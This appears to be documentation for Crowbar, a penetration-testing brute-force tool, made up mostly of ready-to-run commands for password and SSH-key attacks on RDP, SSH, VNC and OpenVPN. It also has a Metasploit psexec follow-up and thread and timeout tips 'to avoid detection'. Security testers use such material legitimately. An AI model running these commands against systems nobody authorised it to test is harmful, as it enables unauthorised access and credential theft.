---
title: "Crowbar - Brute Force Tool for OpenVPN, RDP, SSH Keys, and VNC"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Network Attacks"
tags:
  - "crowbar"
  - "brute-force"
  - "rdp"
  - "ssh"
  - "vnc"
  - "openvpn"
  - "password-cracking"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "4.2"
tool_url: "https://github.com/galkan/crowbar"
kali_url: "https://www.kali.org/tools/crowbar/"
license: "MIT"
---

# Crowbar - Brute Force Tool

## Overview

**Crowbar** (formally known as Levye) is a brute forcing tool designed to support protocols that are not currently supported by thc-hydra and other popular brute forcing tools. Unlike most brute forcing tools that use username/password combinations for SSH, Crowbar uses SSH keys, allowing penetration testers to leverage any private keys obtained during engagements to attack other SSH servers.

**Key Differentiator**: Crowbar fills the gap for protocols that hydra and similar tools do not support, particularly SSH key-based brute forcing and OpenVPN credential testing.

**Supported Protocols**:
- **OpenVPN** (`-b openvpn`) - VPN credential brute forcing
- **RDP** (`-b rdp`) - Remote Desktop Protocol with NLA support
- **SSH Keys** (`-b sshkey`) - SSH private key authentication
- **VNC** (`-b vnckey`) - VNC key authentication

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y crowbar
```

### From Source

**Debian 9/10+ & Kali Rolling**:
```bash
sudo apt install -y nmap openvpn freerdp2-x11 tigervnc-viewer python3 python3-pip
git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt
```

**Debian 7/8 & Kali 1/2**:
```bash
sudo apt-get install -y nmap openvpn freerdp-x11 vncviewer
git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt
```

**Dependencies**:
- `nmap` - Port scanning for discovery mode
- `openvpn` - OpenVPN client
- `freerdp2-x11` or `freerdp-x11` - RDP client
- `tigervnc-viewer` or `vncviewer` - VNC client
- `python3` and `python3-pip` - Python runtime

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-b` | Target service: `openvpn`, `rdp`, `sshkey`, `vnckey` |
| `-c` | Static password to login with |
| `-C` | Password list file path |
| `-d` | Discovery mode - run TCP port scan (nmap) before brute forcing |
| `-D` | Enable debug mode |
| `-h` | Show help menu |
| `-k` | Key file or folder path (for SSH or VNC) |
| `-l` | Log file path (default: `./crowbar.log`) |
| `-m` | OpenVPN configuration file path |
| `-n` | Thread count |
| `-o` | Output file for successful attempts (default: `./crowbar.out`) |
| `-p` | Port number (if non-default) |
| `-q` | Quiet mode - only show successful logins |
| `-s` | Target IP address/range in CIDR notation |
| `-S` | File containing target IP addresses |
| `-t` | Timeout value |
| `-u` | Single username |
| `-U` | Username list file path |
| `-v` | Verbose mode (shows all attempts) |

## Usage Examples

### RDP Brute Forcing

**Single IP, Single Username, Single Password**:
```bash
crowbar -b rdp -s 192.168.1.100/32 -u admin -c password123
```

**Single IP, Username List, Single Password**:
```bash
crowbar -b rdp -s 192.168.1.100/32 -U /usr/share/wordlists usernames.txt -c password123
```

**Single IP, Single Username, Password List**:
```bash
crowbar -b rdp -s 192.168.1.100/32 -u administrator -C /usr/share/wordlists/rockyou.txt
```

**Subnet Scan with Discovery Mode**:
```bash
crowbar -b rdp -s 192.168.1.0/24 -U usernames.txt -C passwords.txt -d
```

**Domain Username Format**:
```bash
# Backslash notation
crowbar -b rdp -s 192.168.1.100/32 -u "DOMAIN\\username" -c password123

# UPN notation
crowbar -b rdp -s 192.168.1.100/32 -u "username@DOMAIN" -c password123
```

### SSH Key Brute Forcing

**Single Key File**:
```bash
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/id_rsa
```

**All Keys in Folder**:
```bash
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/
```

**Subnet with Discovery**:
```bash
crowbar -b sshkey -s 192.168.1.0/24 -u root -k ~/.ssh/ -d
```

### VNC Key Brute Forcing

**Single VNC Key File**:
```bash
crowbar -b vnckey -s 192.168.1.100/32 -k ~/.vnc/passwd
```

**Custom Port**:
```bash
crowbar -b vnckey -s 192.168.1.100/32 -p 5902 -k ~/.vnc/passwd
```

### OpenVPN Brute Forcing

**With Configuration File and Certificate**:
```bash
crowbar -b openvpn -s 192.168.1.100/32 -p 1194 -m /path/to/config.ovpn -k /path/to/ca.crt -u vpnuser -c vpnpass
```

**Extract Remote Server from Config**:
```bash
# Find remote server address
grep remote ~/Desktop/vpnbook.ovpn
# Example output: remote vpn.example.com 1194 udp

# Resolve to IP
host vpn.example.com | awk '{print $1}'
# Example output: 198.7.62.204

# Run attack
crowbar -b openvpn -s 198.7.62.204/32 -p 1194 -m ~/Desktop/vpnbook.ovpn -k ~/Desktop/vpnbook_ca.crt -u vpnbook -c password123
```

### Advanced Options

**Verbose Output**:
```bash
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt -v
```

**Multiple Threads**:
```bash
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt -n 5
```

**Custom Timeout**:
```bash
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/id_rsa -t 30
```

**Custom Output Files**:
```bash
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt -l /tmp/crowbar.log -o /tmp/results.out
```

## Output Interpretation

### Successful Login

```
2024-01-15 14:30:25 RDP-SUCCESS : 192.168.1.100:3389 - "admin":password123
```

**Format**: `DATE TIME PROTOCOL-SUCCESS : IP:PORT - "USERNAME":PASSWORD`

### Failed Attempt (Verbose Mode)

```
2024-01-15 14:30:20 RDP-FAILED : 192.168.1.100:3389 - "admin":wrongpass
```

### Discovery Mode Output

```
2024-01-15 14:30:15 DISCOVER : 192.168.1.100:3389 is open
2024-01-15 14:30:16 DISCOVER : 192.168.1.101:3389 is closed
```

## Integration with Other Tools

### Workflow: Discover → Brute Force → Exploit

```bash
# Step 1: Discover RDP hosts
nmap -p 3389 --open 192.168.1.0/24 -oG rdp_hosts.txt

# Step 2: Extract IPs
grep "3389/open" rdp_hosts.txt | awk '{print $2}' > targets.txt

# Step 3: Brute force discovered hosts
crowbar -b rdp -S targets.txt -u administrator -C passwords.txt -n 3
```

### Integration with Metasploit

```bash
# After finding credentials with Crowbar
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser admin; set SMBPass password123; exploit"
```

## Operational Security

### Rate Limiting

```bash
# Reduce thread count to avoid detection
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt -n 1

# Increase timeout between attempts
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/id_rsa -t 60
```

### Logging

```bash
# Enable detailed logging
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt -l /tmp/crowbar_$(date +%Y%m%d).log
```

## Common Issues and Troubleshooting

### Issue: RDP Connection Refused

**Cause**: Target not running RDP or firewall blocking.

**Solution**:
```bash
# Verify RDP is running
nmap -p 3389 192.168.1.100

# Test with xfreerdp manually
xfreerdp /v:192.168.1.100 /u:test /p:test
```

### Issue: SSH Key Authentication Fails

**Cause**: Key format not supported or key passphrase required.

**Solution**:
```bash
# Verify key is readable
ls -la ~/.ssh/id_rsa

# Test key manually
ssh -i ~/.ssh/id_rsa root@192.168.1.100

# Convert key if needed
ssh-keygen -p -f ~/.ssh/id_rsa
```

### Issue: VNC Connection Timeout

**Cause**: VNC server not running or wrong port.

**Solution**:
```bash
# Scan for VNC ports
nmap -p 5900-5910 192.168.1.100

# Test with vncviewer
vncviewer 192.168.1.100:5900
```

## Best Practices

### Wordlist Optimization

```bash
# Generate targeted wordlist
cewl -d 2 -m 5 http://target.com -w target_wordlist.txt

# Combine with common passwords
cat /usr/share/wordlists/rockyou.txt target_wordlist.txt | sort -u > combined.txt
```

### Parallel Attacks

```bash
# Attack multiple services simultaneously
crowbar -b rdp -s 192.168.1.100/32 -u admin -C passwords.txt &
crowbar -b sshkey -s 192.168.1.101/32 -u root -k ~/.ssh/ &
wait
```

## Resources

- **GitHub Repository**: https://github.com/galkan/crowbar
- **Kali Linux Tools**: https://www.kali.org/tools/crowbar/
- **Author**: Gokhan Alkan
- **License**: MIT

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Medusa**: Modular design, good for parallel testing
- **Patator**: Advanced features, more flexible but complex
- **Ncrack**: Network authentication cracking, good for large-scale audits
